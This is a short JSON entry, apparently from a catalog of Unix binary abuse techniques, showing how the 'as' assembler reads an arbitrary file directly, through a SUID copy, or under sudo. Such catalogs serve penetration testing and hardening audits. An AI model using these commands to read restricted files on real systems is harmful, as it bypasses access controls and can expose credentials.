{
  "functions": {
    "file-read": [
      {
        
        "code": "LFILE=file_to_read\nas @$LFILE\n"
      }
    ],
    "suid": [
      {
        
        "code": "LFILE=file_to_read\n./as @$LFILE\n"
      }
    ],
    "sudo": [
      {
        
        "code": "LFILE=file_to_read\nsudo as @$LFILE\n"
      }
    ]
  }
}
